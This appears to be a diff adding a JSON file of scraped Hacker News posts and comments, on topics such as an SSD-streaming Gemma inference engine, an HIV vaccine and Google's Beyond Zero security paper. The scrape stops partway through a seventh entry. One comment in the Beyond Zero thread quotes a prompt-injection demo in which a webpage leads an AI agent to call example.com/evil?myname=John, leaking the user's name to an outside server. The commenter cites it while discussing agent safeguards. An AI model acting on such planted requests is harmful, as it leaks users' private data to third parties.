@@ -1,0 +1,939 @@
+{
+  "scraped_date": "2026-07-30",
+  "source": "hacker_news",
+  "total_scraped": 130,
+  "nontech_count": 30,
+  "posts": [
+    {
+      "id": "49098510",
+      "title": "Show HN: Open-source engine running Gemma 4 26B in 2 GB RAM on any M-series Mac",
+      "link": "https://github.com/drumih/turbo-fieldfare",
+      "domain": "github.com",
+      "author": "gitpusher42",
+      "score": 665,
+      "comment_count": 233,
+      "created_ts": 1785337543,
+      "is_internal": false,
+      "post_text": "Hi HN,<p>I built a specialized inference engine for running 4-bit Gemma 4 26B-A4B-IT on any M-series Mac using about 2 GB of RAM. It is called TurboFieldfare and is written in Swift and Metal.<p>I have always adored on-device AI. It feels like magic that you can run a powerful NN on your Mac or iPhone. So I wanted to push the limits a bit and run a model whose weights don’t fit in memory.<p>The model’s 4-bit quantized weights occupy roughly 14 GB, which makes running it with conventional inference tools almost impossible on an 8 GB or even 16 GB Mac once the OS, applications, and KV cache are included.<p>The trick is to keep the shared part of the model and the KV cache in RAM, then stream only the routed experts needed for each token from SSD. An SSD is way slower than RAM, so the runtime uses a small expert cache and bounded parallel `pread`. While those reads are in flight, the GPU runs the shared part of the layer.<p>I ran more than 100 experiments. Most didn’t work. A few got me here. The experiments are described in the GitHub repo.<p>It currently generates 5–6 tok&#x2F;s on an 8 GB M2 MacBook Air and 31–35 tok&#x2F;s on an M5 MacBook Pro.<p>I also added an experimental OpenAI-compatible local server. It supports streaming and tool calls, and reuses one prompt prefix from the KV cache.<p>Try it! The Mac app is easy to install. On the first run, it will download 15 GB of weights from Hugging Face. The model is surprisingly capable.<p>I would love any kind of feedback!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": [
+        {
+          "top": "Nice, I think this is the second time I see this here on HN, I always wondered why we need to shove the entire model into memory, I don't care who King Charles is every single time. It always felt as though we already figured out how to break up large files and parse them efficiently with very little memory.\nFrontier AI feels like its full of people who are brilliant at making models, but when it comes to scale and practicality, they just leave it to whoever sets up infrastructure to worry about. I wouldn't be surprised if frontier AI could be drastically cheaper if they just finetune and optimize their models to not consume all available RAM to only access less than 10% of the models knowledge.",
+          "author": "giancarlostoro",
+          "replies": [
+            {
+              "text": "I don't care who King Charles is every single time\nthat's the trick and a multi-billion dollar question, how would an llm engine know that? it's an active research area how to cull the initial layer surface and do the optimal traversal path through the layers and it's a damn hard problem. It's definitely an area where a ton of performance is left on the table still.",
+              "author": "Keyframe",
+              "depth": 1
+            },
+            {
+              "text": "The human analogy would be that I don’t remember everything in the books I have read, but I do recall reading a particular book and can always look it up.\nSo, is there a way to train a neural network and then tune it forget a lot of the facts that can be easily retrieved, but keep the intelligence.",
+              "author": "spot5010",
+              "depth": 2
+            },
+            {
+              "text": "LLMs can do that. The one that's built in to google search is relatively stupid, but it just uses web pages to fill in the gaps.\nThe downside is it is incredibly easy to be tricked by a single false bit of info.",
+              "author": "Gigachad",
+              "depth": 3
+            },
+            {
+              "text": "Seems to me like there's a conflict of incentives in the current era of market capture.\nNot to say the cost-cutting wouldn't be valuable; today's race is predominantly about the model's reasoning capacity or \"how hard of a math problem can the model solve\".\nIt'll be a nice day when research-oriented human capital gets redirected to things that benefit us layfolks's pockets more directly",
+              "author": "ComputerPerson",
+              "depth": 2
+            },
+            {
+              "text": "This makes me think (by full ignorance) how quantum computing can be useful in this field of things reach a stable-ish point",
+              "author": "IdontKnowRust",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "With my M1 MBA, I am still on macOS 15. To compile it, just remove the two lines with\n  opts.languageVersion = .version4_0\n\n\nor surround them with\n  if #available(macOS 26.0, *) {\n    opts.languageVersion = .version4_0\n  }\n\n\nYou'll miss out on a prefill speedup of 2.4x (as it yields 11.24x faster attention), according to the git comments, but it works. (On the 8-GPU-core MBA M1, I get 5-6 tok/s.)",
+          "author": "xenonite",
+          "replies": [
+            {
+              "text": "Thank you! That’s useful. I might try lowering the minimum version later.\nThe 2.4x prefill improvement will only work on the apple10 GPU family. The M1 uses apple7 as I remember",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "I'm looking forward to trying it, but not willing to upgrade to Tahoe, so I'd appreciate it for sure!",
+              "author": "wilj",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "I'm curious how your project compares to plain mmap!\nBecause llama.cpp will already run 26B in 2GB of RAM if you really want to (mmap enabled, repacking disabled).\nIt seems like the main difference is that your project synchronizes the SSD reads with inference activity, which you've presumably tuned to cause the least latency possible? Whereas the OS wouldn't care about any of that.",
+          "author": "tredre3",
+          "replies": [
+            {
+              "text": "My first version used plain `mmap`. On the 8 GB M2, a cold 3.36 MB expert took 10 ms with mmap and 2.8 ms with `pread`. The full simulation was 0.50tok/s for `mmap` vs 4 tok/s for `pread`\nWith `mmap`, OS loads pages reactively as the model touches them. It doesn’t know which experts were selected or when their reads could overlap with GPU work\nAnd common weights still use mmap for simplicity\nSo, I believe llama.cpp might run it under 2gb, but I assume it will be slower",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "hm. in linux you have MAP_POPULATE which forces a prefetch where macos relies on page faults and lazy loading. if MADV_WILLNEED doesn't help, maybe readv to vector read directly or mmap+writev (write to a dummy fd, with an iovec for each page, hopefully resulting in a one-syscall-big-pagefault for mmap.) maybe also experiment with a loop that just reads one byte from each relevant page after mmap but before real computation?",
+              "author": "a-dub",
+              "depth": 2
+            },
+            {
+              "text": "for a given expert, do you have a sense for what the spatiotemporal access pattern looks like?",
+              "author": "a-dub",
+              "depth": 2
+            },
+            {
+              "text": "Yeah, I checked it. One expert is about a 3.36mb block. If a cache miss happens I read whole block with one pread.\nAnd there is some reuse. ~41% selected again for the next token, ~57% within two. Each layer has its own experts, so no reuse between these layers.",
+              "author": "gitpusher42",
+              "depth": 3
+            },
+            {
+              "text": "Any idea if madvise helps? Admittedly I have very limited experience and only on Linux",
+              "author": "nijave",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "Ran this on a 64 GB M4 Max MacBook. I figured having Gemma available with a small footprint would be a nice setup. No more unloading models when I need more RAM for work? Hell yea.\nGot 48 tok/s decode at 1.9 GB RSS (2.4 GB peak), faster than the 24 GB M5 Pro mentioned in the benchmarks. The ~2.0 GB/s SSD number quoted for M4 is the base chip. This M4 Max does ~7 GB/s.\nPage cache seems to be why it beats the M5 Pro. With 64 GB the whole 12 GB packed_experts set stays resident, and iostat shows only ~1.6 GB per run actually reaching disk, against the ~79 GB that 98 fully cold tokens would need.\nI then tested with DaVinci Resolve open and under load (playback): 42.6 tok/s. Also held 38 GB of incompressible memory to squeeze the page cache: 41.8. At 48 GB it ranged 32 to 41.5. Degrades gradually rather than a cliff. It's a beautiful thing.",
+          "author": "pwython",
+          "replies": [
+            {
+              "text": "M4 Max is typically better than M5 Pro for inference IIRC.",
+              "author": "fouc",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "> The measured result is a reference point, not a performance ceiling.\nClaude was here.",
+          "author": "woadwarrior01",
+          "replies": [
+            {
+              "text": "I am not native, my English is far away from perfect. I am using LLMs for checking my texts or grammar. I always trying to edit it properly, but sometimes I missing parts like that because I don't really have this \"language feeling\" as natives. Apologies for this",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "Friendly feedback: write in your native language and use \nhttps://deepl.com\n to translate. I am fluent in both German and English. I find Deepl does a much better job at capturing the direct translation of what I’m saying than using Claude/ChatGPT, etc. Results may very for your language…\nVery nice work! Sorry that the AI comments partially overshadowed it.",
+              "author": "sebmellen",
+              "depth": 2
+            },
+            {
+              "text": "Thanks! Will try!",
+              "author": "gitpusher42",
+              "depth": 3
+            },
+            {
+              "text": "I grind my teeth when I see it. It's so pervasive that I worry I'll pick up the same ticks by reading so much Claudeslop.",
+              "author": "sebmellen",
+              "depth": 1
+            },
+            {
+              "text": "you're absolutely right",
+              "author": "micromacrofoot",
+              "depth": 2
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49083314",
+      "title": "New HIV vaccine shows unprecedented success in preclinical study",
+      "link": "https://www.lji.org/news-events/news/post/new-hiv-vaccine-shows-unprecedented-success-in-preclinical-study/",
+      "domain": "www.lji.org",
+      "author": "codebyaditya",
+      "score": 649,
+      "comment_count": 292,
+      "created_ts": 1785244321,
+      "is_internal": false,
+      "post_text": "",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "success"
+      ],
+      "comments": [
+        {
+          "top": "The most interesting point of the article for me is that this vaccine appears to be a series of shots which act as a curriculum for the immune system. Each one slightly different and targeting a different stage of B-cell development. I've never thought of vaccine series working like that, so it was a new and impressive idea.",
+          "author": "iandanforth",
+          "replies": [
+            {
+              "text": "The way the HIV evades effective antibodies is by tricking the immune system to generate antibodies for fake decoy targets that the virus will immediately mutate.\nSo each turn, B-cells are presented with the latest version of the virus, they generate various antibodies to the various parts, and are graded at the end by how well the generated antibodies bind to the virus. The problem is that you have 1 million cells which bind strongly to the fake decoy targets and 1 cell which will bind not as strong to the real effective target. So this 1 cell never gets \"promoted\".\nWhat this \"germline targeting\" multi-shot vaccine tries to do is to introduce a series of targets that stimulate that 1 in a million cell which will attack the right part of the HIV virus, so it gets \"promoted\", so if the real virus appears, the body will still go for the decoy targets, but will also generate a lot of these really effective 1 in a million cells, which got \"promoted\" previously by the vaccine.\nTo be more precise, you need to \"guide\" a lets call it B1 cell that all of us have in our repertoire to mutate into B2 then B3 than B4, because this B4 version will be capable of creating the right antibodies for HIV, the issue being that the intermediary states, B2, B3 are not naturally promoted so you very rarely get to the B4 state without this intervention.",
+              "author": "dist-epoch",
+              "depth": 1
+            },
+            {
+              "text": "A fascinating everyday arms race I had no idea was playing out around me.",
+              "author": "wwweston",
+              "depth": 2
+            },
+            {
+              "text": "Here’s a fun read on that arms race\nThe acquired immune system: a vantage from beneath\nhttps://pubmed.ncbi.nlm.nih.gov/15539148/\nBasically saying our immune systems ensure that microbes get ever more devious\nHowever there’s ways that we counter that, like mucus that basically slowly feeds and tames your bacteria. Doesn’t work on viruses though",
+              "author": "pazimzadeh",
+              "depth": 3
+            },
+            {
+              "text": "Everything I hear is about bacterias though. I wish we found more about viruses.",
+              "author": "Fire-Dragon-DoL",
+              "depth": 4
+            },
+            {
+              "text": "viruses and transposons are a major source of creativity in life. the adaptive immune system of jawed vertebrates like us, which defends against viruses, only exists because the RAG transposon inserted itself into the gonads of our fish ancestors 500 million years ago\nOrigin of immunoglobulins and T cell receptors: A candidate gene for invasion by the RAG transposon\nhttps://pubmed.ncbi.nlm.nih.gov/40614193/",
+              "author": "pazimzadeh",
+              "depth": 5
+            }
+          ]
+        },
+        {
+          "top": "While HIV vaccine research is an exciting field, it's worth pointing out that halting HIV transmission is, practically speaking, a solved problem with oral and injectable reverse transcriptase inhibitors. The ongoing loss of life and health due to HIV could be stopped if we cared enough to invest resources in wide-scale PrEP availability and public health education. Waiting for an HIV vaccine is the domain equivalent of hoping fusion power will solve our energy needs. Other solutions exist already; we just have to use them.",
+          "author": "RGS1811",
+          "replies": [
+            {
+              "text": "You could say the same about teen pregnancy being a practically solved problem, except there is still the problem of teen pregnancy. Or even something more mundane as driving consistently safely all the time to solve the problem of accidents.\nIf everyone was disciplined all the time in regard to everything, many problems in the world would simply not exist. But we live in reality where for whatever reason, people don't know to do something, or they do know and they're just not disciplined, or they make a mistake due to extenuating circumstances. And I would expect that the vast majority of people would oppose any idea of somehow punitively \"dealing with\" people who get some things wrong.\nSo I would say that it's very evidently not a practically solved problem, because if it were we wouldn't be looking to solve it still.\nWithin this reality, a vaccine is a great additional tool at solving the problem of preventing the spread of HIV.",
+              "author": "jonathanlydall",
+              "depth": 1
+            },
+            {
+              "text": "> You could say the same about teen pregnancy being a practically solved problem, except there is still the problem of teen pregnancy. Or even something more mundane as driving consistently safely all the time to solve the problem of accidents.\nAt the risk of derailing this conversation from the original topic, those two things are not remotely equivalent. There's no organized political movement trying to tell people that seat belts and speed limits are immoral, and you should only drive when you're willing to accept the responsibility that comes with the risks.",
+              "author": "saghm",
+              "depth": 2
+            },
+            {
+              "text": "Where I am from, organised political movements are not a factor of teen pregnancy and were not the least bit in my mind when I made my statement.\nAnd my two examples are completely arbitrary because my point applies to pretty much any problem which would be solved by people being “more careful”.\nSo, political/religious elements aside, teen pregnancy and road safety are the same in terms of “if people were just more disciplined, there would not be these problems” (i.e. if teens who have easy access to contraceptives planned ahead before giving into impulsiveness; if drivers were more attentive to their behaviour), which I then pointed out is naive because the reality is that people aren’t perfect, they aren’t always disciplined, we’re all only human.\nHence, we need other solutions to help with problems which don’t require ignoring that people are only human and lack perfect discipline.\nI agree that some organised movements can be a problem in that they can make other problems worse.",
+              "author": "jonathanlydall",
+              "depth": 3
+            },
+            {
+              "text": "My point is that teen pregnancy very much does have a solution that has empirically worked quite well at preventing it when it's actually practiced (i.e. high quality sex education and ample access to contraceptives), and pushing abstinence as a solution has demonstrably caused teen pregnancy rates in \nincrease\n whenever it's used as a replacement for that; the only actual impetus for abstinence as a \"solution\" is ideological. I think teen pregnancy literally \nwould\n be a solved problem (with instances being essentially a rounding error) in a society embracing what we actually have proven works well at preventing it; I've never seen any similarly successful mechanism at preventing injuries or deaths in automobile accidents be rejected by a society for ideological reasons.\nTrying to handwave away the things we know work to prevent teen pregnancy as \"just be careful\" feels overly reductive, because it's way easier to do correctly than managing to drive without ever having an accident.",
+              "author": "saghm",
+              "depth": 4
+            },
+            {
+              "text": "Talking about road safety.\nIn South Africa we have 12,000+ road \nfatalities\n a year, by comparison Australia (renowned for strong law enforcement) with about half of our population size has 1,200 or something. (And they apparently happen to have about 4,500 teen pregnancies a year.)\nAustralia’s (or maybe it was New Zealand’s which I visited on the same trip) road safety campaign is called “Towards Zero”, while South Africa’s is called “Arrive Alive”.\nA big part of the difference in fatalities is that Australia has much better general law enforcement (such that a lot of foreigners complain about it), while over here it’s dismal with Arrive Alive’s strategy seemingly being to always do the same thing as last year’s holiday season except with “trying harder”, while largely ignoring day-to-day traffic offences.\nDue to the high chance of being caught for transgressions, Australians tend to way more often stick to the rules of the road, while over here there is horrendous amount of (to put it politely) shenanigans happening almost all the time.\nAnd the impact of this difference in discipline shows in the above stats.\nYears ago now, but my now wife spent 10 days in intensive care after a minibus taxi driving on the wrong side of the road head on collided into the car she was a passenger in. My wife was fortunately in a car with good safety features and had a medical aid plan allowing her to receive some of the best care possible in the country, but I’m doubtful that the mini bus taxi passengers (who tend to be in the poor class of the population) sent to public hospitals received care anywhere near as good, I think I heard after this article [1] was published that two people died.\nPerhaps road accidents, or at least fatalities, can be reduced more than you realize.\n[1]: \nhttps://www.citizen.co.za/northcliff-melville-times/222787/2...",
+              "author": "jonathanlydall",
+              "depth": 5
+            }
+          ]
+        },
+        {
+          "top": "The actual paper - never trust press releases from authors' institutions: \nhttps://www.nature.com/articles/s41586-026-10837-5\nPeer review files: \nhttps://media.springernature.com/original/springer-static/es...\nIndependent article covering it: \nhttps://cen.acs.org/pharmaceuticals/vaccines/hiv-vaccine-can...",
+          "author": "croemer",
+          "replies": []
+        },
+        {
+          "top": "Phase I trials happening now. Godspeed to them. It’s where most HIV vaccines die",
+          "author": "khalic",
+          "replies": [
+            {
+              "text": "I invested in Moderna around the time they had their vaccine enter Phase I trials, hoping for a pay off.\nPaid off it did not.",
+              "author": "cromka",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "I have to admit that given how many times we have been here, I struggle with being excited about any news about a HIV vaccine until we see results from humans. Just way too many times of hope.\nThat being said, I don't understand enough to parse this very buzzword heavy release. Is this fundamentally different than the every 6 month vaccine we have now and is a more traditional vaccine or is it just continuing on that trend?",
+          "author": "nerdjon",
+          "replies": [
+            {
+              "text": "The reason why this is a big deal is because they figured out a way to engineer the type of cells that are hard to create that can readily fight off the virus.  In some people they create them already.  Here they were able to get the body to create them.\nI agree it is far off from something in humans but it's a giant leap. The way I see it is like sending Laika in space before we send humans. It's significant and promising of a future where humans might have a vaccine.",
+              "author": "xutopia",
+              "depth": 1
+            },
+            {
+              "text": "Long-acting antiretroviral injection ≠ vaccine",
+              "author": "noname120",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49090607",
+      "title": "Show HN: I was tired of opening 2 tabs for every HN link, so I made a userscript",
+      "link": "https://github.com/twalichiewicz/HNewhere",
+      "domain": "github.com",
+      "author": "twalichiewicz",
+      "score": 409,
+      "comment_count": 114,
+      "created_ts": 1785276546,
+      "is_internal": false,
+      "post_text": "HN is great for the links people share, but a big part of the value I get comes from reading the discussion around them. I realized I was always opening the article in one tab and the comments in another, constantly switching back and forth.<p>I figured there was probably a simpler way, so I threw together this userscript to merge the two.<p>1. Clicking a link from Hacker News opens the article with a side panel containing the discussion. It doesn&#x27;t require your credentials, is resizable, and is easy to tweak if you want to customize it.<p>2. If you land on an article that has previously been shared on HN, the script finds the existing discussion and adds a button in the top-right to open the panel.<p>Feedback welcome.",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49081644",
+      "title": "Google's Beyond Zero: Enterprise Security for the AI Era",
+      "link": "https://spawn-queue.acm.org/doi/10.1145/3819083",
+      "domain": "spawn-queue.acm.org",
+      "author": "jordigg",
+      "score": 155,
+      "comment_count": 79,
+      "created_ts": 1785232753,
+      "is_internal": false,
+      "post_text": "",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "enterprise"
+      ],
+      "comments": [
+        {
+          "top": "\"\"\"\nBeyond Zero shifts the trust boundary from the application to the action being performed on a piece of data in realtime—and from after-the-fact investigation to in-the-moment evaluation and containment. It augments BeyondCorp’s foundational identity with a “brain” capable of reasoning about the context and intent of a specific request in realtime.\n\"\"\"\nDoesn't this simply shift the attack vector? Compromising this overlord brain now becomes a new target.",
+          "author": "kriro",
+          "replies": [
+            {
+              "text": "All security measures \"simply shift the attack vector.\" The idea is to shift it to something that is more difficult to compromise.",
+              "author": "thesuitonym",
+              "depth": 1
+            },
+            {
+              "text": "This is oversimplifying.\nFor example, encryption at rest or in transit essentially eliminates attack vectors. The possible attack avenues necessarily shift as a result, but only because an avenue was blocked.\nThat's very different from e.g. adding a layer of protection around something insecure, where the insecure thing remains insecure inside the protection, which I think is what the other commenter was imagining.\nSimilarly, memory safe languages (including most GC languages, not just a certain language beginning with R) eliminate entire classes of security hole. Again, the possible attack vectors necessarily \"shift\", but that doesn't capture the fact that you've entirely eliminated a class of attacks.\nThe same goes for eliminating unnecessary services, firewall holes, etc.\nNone of these are specifically trying to \"shift it to something to something that is more difficult to compromise.\" They're entirely blocking attack vectors, and the strength or weakness of other parts of the system aren't really a factor.",
+              "author": "antonvs",
+              "depth": 2
+            },
+            {
+              "text": "Doesn’t encryption shift the attack vector to the key and/or the method?",
+              "author": "madeofpalk",
+              "depth": 3
+            },
+            {
+              "text": "That's a different attack vector. The attack vector that involves accessing plain text has been eliminated. An attack vector is a specific path or method that can be used to break into a system.",
+              "author": "antonvs",
+              "depth": 4
+            },
+            {
+              "text": "> That's a different attack vector\nSo you’re saying that the attack vector has… shifted.",
+              "author": "orf",
+              "depth": 5
+            }
+          ]
+        },
+        {
+          "top": "Honestly I think non-malicious odd behavior is under-weighted when it comes to AI agents. Even the example in this paper is about someone suspiciously accessing sales data when \"why did you do that\" often comes down to something in the model's training that fired as a reflex\nI wrote about this a few days ago \nhttps://firasd.substack.com/p/accidental-data-loss-in-claude...\n\"Many researchers have made demos along these lines:\nAn agent is asked to check a webpage like example.com\nThe webpage asks for a name to proceed further\nThe agent calls example.com/evil?myname=John, thus sending the user’s name from the context window to the external server.\nIn practice, however, these elaborate ‘confused deputy’ exfiltration attacks seem rare compared to widely-reported data loss incidents.\nThe risk of undermining the user’s interests through clumsiness deserves at least as much scrutiny as the risk of leaking secrets.\"\nSo while the idea of shifting the permission boundary from the app level to the action level makes sense, what we should also have is some 'failsafes', eg. if the action says 'delete' then maintain a rollback window, if the action is 'send an email' then maintain an events log. Preparing for AI agents means expanding auditability and reversibility in software",
+          "author": "firasd",
+          "replies": [
+            {
+              "text": "> Preparing for AI agents means expanding auditability and reversibility in software\nWhile I think that makes sense, I also think more controls are a good solution. That is, prevent access to the sales data without escalation, probably to a human, but possibly to another AI. The issue there is twofold:\n- if you start with least privilege, the agents become less useful\n- need to balance escalation with frequency otherwise it's just another version of MFA fatigue\nAgree that auditability is important because otherwise you don't know what you don't know.",
+              "author": "mooreds",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "My goodness, the security layer looks like it could be more complex than the applications themselves.\nAnd if this security agent is wandering around the IT system gathering all of these details about access and identity and business process, who watches the watcher?  How does that thing build and maintain trust?",
+          "author": "seanc",
+          "replies": []
+        },
+        {
+          "top": "> In this scenario, a system administrator logs into a service as usual, but in another window is looking up basic questions about the architecture of the system—information that would be obvious to anyone experienced at the company. These signals are placed in long-term storage but are then processed into an attribute indicating potential risk.\nEvery system admin is going to send that signal. People pin pictures of the architecture to the walls sometimes.",
+          "author": "nitwit005",
+          "replies": []
+        },
+        {
+          "top": "If this is interesting to you (as it is to me) but you want to quickly digest it instead of read the paper, Claude + SmallDocs[1] converted it into a slideshow which serves it to you in bitesized ideas:\nhttps://smalldocs.org/s/2SH6FHiUK1mcym24Z8E37I#k=2Sk6c_IdKJL...\n[1] I am the developer behind SmallDocs.",
+          "author": "FailMore",
+          "replies": [
+            {
+              "text": "not sure if you made the app or not - I like it a lot, only feedback is it should be a bit more intuitive on how to start the slides, I couldn't figure it out and old ppl like me don't always know",
+              "author": "BorisMelnik",
+              "depth": 1
+            },
+            {
+              "text": "Press the arrow key.",
+              "author": "freshpots",
+              "depth": 2
+            },
+            {
+              "text": "I think he means that you need to click the little TV icon in the top right of the embedded slides. Then you can use the arrow keys to advance them, yes.",
+              "author": "mh-",
+              "depth": 3
+            },
+            {
+              "text": "The font is different after downloading from the preview on the web page, but I still like it.",
+              "author": "troyzhxu",
+              "depth": 1
+            },
+            {
+              "text": "really nice project! I would never consider websockets for the bridge mode, why do browsers allow websockets to localhost crossing domains ahah",
+              "author": "aniceperson",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49100043",
+      "title": "Show HN: CheapFoodMap – A map of good meals under $10",
+      "link": "https://cheapfoodmap.com/",
+      "domain": "cheapfoodmap.com",
+      "author": "jaep1",
+      "score": 136,
+      "comment_count": 156,
+      "created_ts": 1785344392,
+      "is_internal": false,
+      "post_text": "I was recently laid off after 18 years, and gave myself 100 days to build soething useful in public. CheapFoodMap is a crowdsourced map of meal under $10, excluding franchises, local good eats only.<p>It&#x27;s inspried by 거지맵 (Begger&#x27;s Map) a Korean crowdsourced map students use to find cheap eats.<p>Ocverage is heaviest in Texas, since I live in Dallas, but have 1200 meals across 15 US cities. Seed data came from Google Review, 4.2 star or higher with at least 500 reviews, and verified price under $10 per menu item.<p>Things I would love feedback on : whether the price-freshness model makes sense, and what would make you trust the price on a site like this. How to encourage people to update prices, since inflation is making food price very frequent.<p>https:&#x2F;&#x2F;cheapfoodmap.com<p>Any and all suggestion will be super helpful. Thank you!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": [
+        {
+          "top": "This feels like GasBuddy, but for food.\nOne of the reasons GasBuddy took off was that it wasn't just based on community reports; there was an incentive for gas stations themselves to accurately report their prices and keep them up to date.\nIt seems like you're trying to discourage businesses from participating (e.g. by not accepting sponsored placements), and that will have implications for your growth rate.  I think you should look for ways to give businesses an active role, without eroding user trust in the recommendations, of course.\nThink of the possibilities:\n- Business can add coupons to its listing, making cheap food even cheaper\n- Business can confirm a reported deal, adding to its credibility\n- Business can provide full menu and a link to order takeout\nI don't think any of those features would make users feel like the business is \"buying\" a listing it didn't earn.",
+          "author": "jawns",
+          "replies": [
+            {
+              "text": "Wow, thank you for this suggestion. This might be most sustainable way to update prices, as long as I set boundaries correctly. I will research how GasBuddy set up their data pipeline this week to see if we can benchmark.",
+              "author": "jaep1",
+              "depth": 1
+            },
+            {
+              "text": "I could be wrong but I think you’ll want to consider changing the name. The parent post is on point, but companies won’t be attracted by the “cheap food” moniker. Even “budget food” is more palatable for a restaurant to associate with.",
+              "author": "Waterluvian",
+              "depth": 2
+            },
+            {
+              "text": "This was our biggest concern as well. I already talked to few owners and negative connotation was making them reluctant to be on the site.. We thought about different name like \"under10\" \"dimedrop\" \"Fooglemap\" but none of them stuck. (We did like the name Fooglemap, but similarity to Google map will create risk of cease and decease letter if it ever becomes major.. so decided not to do it.)\nStill torn on name change.. We want cool / memorable name.",
+              "author": "jaep1",
+              "depth": 3
+            },
+            {
+              "text": "May I suggest MealOnADime ? \nDine n' Save \nFind your meal\nI'd say to avoid the under 10 branding because of inflation.",
+              "author": "Belphemur",
+              "depth": 4
+            },
+            {
+              "text": "Meal on a dime sounds good, checking namecheap right now =)",
+              "author": "jaep1",
+              "depth": 5
+            }
+          ]
+        },
+        {
+          "top": "UX report: On desktop chromium, clicked on a \"14 restaurants nearby\" restaurant item, and... nothing changed on the map. Little idea where it is. Got address from popup and... map wasn't showing that street name. Zoom in, pan around, repeat. Struggle. Apparently cluster markers (like \"(2)\") don't visually indicate selection at all. And the unclustered restaurant marker selection indication was subtle enough for me to miss, at least when getting started. Especially given the draws-the-eye distraction of the popup, so the indication transition itself wasn't noticed.\nAlso on the \"restaurants nearby\" list, every card said \"New York, NY\". Unhelpful ink. I wished it was showing the address line, at least when all the city lines were the same.\nA relieved word of thanks for \nnot\n using the frustrating Google Maps \"Search this area\" yes-really-please button.\nI saw someplace interesting, then realized, \"oh yeah, I tried to go there, but they don't open until <after my window>\". Also, \"that looks interesting... I wonder when they're open?\", then checked GMaps via button, which didn't have hours but did have popular times (it's a truck).\nFwiw. Has given me a couple of places to try - thanks!",
+          "author": "mncharity",
+          "replies": []
+        },
+        {
+          "top": "Could see this being useful for people who are on the road for a living, or regularly operating in areas where they’re not familiar with the offerings. Truck drivers, salespeople, etc.\nThat said, kneejerk after using it is: price is a challenging anchor, because food is not uniform. I’d be curious if users are more interested in “under $10, ignoring all else” or “a better deal than comparable” - though, there’s a lot of subjectivity in that.\nGasbuddy works because 1 gallon of gas = 1 gallon of gas, so price is a useful anchor.\n$5 for sushi at one place could be a bad deal, while a great deal at another place.\nAn $8 steak would be cheap. An $8 hot dog would be a ripoff.\nI’d be skeptical of restaurants luring people with a single cheap item, or about quality/portion changes.\nAll this said, Ikea is known for designing furniture _around_ the price their target customer thinks a table should cost. Restaurants are likely (hopefully!) aware of where these price thresholds are for their customers … and your site could be an interesting way of sending them a different type of customer than they’d historically targeted. Or, allow them to refine an offering to maximize profit at the $10 price point.\nAs others have said, engage restaurants and make them part of the equation. They’re not your adversary.\nIn short: cool! Do lots of experiments and research!",
+          "author": "gffrd",
+          "replies": [
+            {
+              "text": "Thank you so much gffrd.\nYou know, my dream is to have some kind of movement where people rally to fight inflation and tipflation. Last few years, we seen some crazy food price increases and it seems like its gonna get worse.\nIf enough people find value in affortable prices, and people go to those restaurants that offer good deals, either as lunch special or weekly promotion, more restaurant will try to offer these kind of deals. Win for customers, win for restuarant.\nMight be getting a head of myself there.. but that's the vision. (If you check \"About\" page, I put another dream which is to make this website turn non-profit later down the road if we make money lol)",
+              "author": "jaep1",
+              "depth": 1
+            },
+            {
+              "text": "To really stop inflation, the fed would have to ramp up interest rates, stop printing money, and Congress would have to cut spending and raise taxes. It's worth it to reward businesses who offer cheap prices, but inflation is inevitable without severe austerity measures.",
+              "author": "mminer237",
+              "depth": 2
+            },
+            {
+              "text": "Interest rate is killing me at restaurant, grocery and my my retirement accout T-T",
+              "author": "jaep1",
+              "depth": 3
+            },
+            {
+              "text": "Could cut demand instead, if we're imagining things.",
+              "author": "9x39",
+              "depth": 3
+            }
+          ]
+        },
+        {
+          "top": "> The map couldn't load. This usually means an ad blocker or privacy extension is blocking Google Maps...\n> Try disabling blockers for cheapfoodmap.com,\nTry disabling your goofy expections  that I'll spend a minute to learn if your page is worth it.",
+          "author": "8bitsrule",
+          "replies": []
+        },
+        {
+          "top": "This is a great idea I fully commend. An additional option for meals under $10 is cooking them oneself too.\nI know this might appear to be obvious, but is still a viable option IMHO.  A used copy of the \"Joy of Cooking\" book and some creative shopping can go a \nlong\n way.",
+          "author": "AdieuToLogic",
+          "replies": [
+            {
+              "text": "This is great idea. Auto populate recipe and link to fill in shopping list on Amazon Fresh.",
+              "author": "jaep1",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49083389",
+      "title": "Show HN: tale.fyi, we deserve a home for fiction",
+      "link": "https://tale.fyi/@sam/announcing-tale-fyi-read-or-listen-to-an-entire-book-from-a-single-link",
+      "domain": "tale.fyi",
+      "author": "samuelcole",
+      "score": 71,
+      "comment_count": 68,
+      "created_ts": 1785244612,
+      "is_internal": false,
+      "post_text": "for decades, i have been concerned that the internet was being built around non-fiction, so i built something to show how we could celebrate great fiction on the web.<p>i started with an amazing library from the public domain, and i also added tools to add your own stories<p>super interested to hear any feedback, and if you read anything good!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49099021",
+      "title": "Ask HN: My domain registrar rug-pulled me for $3000 [fixed]",
+      "link": "https://news.ycombinator.com/item?id=49099021",
+      "domain": "news.ycombinator.com",
+      "author": "shrinks99",
+      "score": 60,
+      "comment_count": 58,
+      "created_ts": 1785339988,
+      "is_internal": true,
